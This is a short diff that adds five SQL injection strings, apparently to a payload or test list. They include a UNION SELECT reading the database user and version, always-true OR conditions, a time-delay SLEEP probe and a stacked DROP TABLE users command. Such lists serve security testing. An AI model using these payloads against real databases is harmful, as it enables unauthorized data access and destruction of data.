@@ -1,0 +1,5 @@
+UNION SELECT 1, user(), version() --
+OR '1'='1'
+' OR 1=1 --
+SLEEP(5)
+1'; DROP TABLE users; --
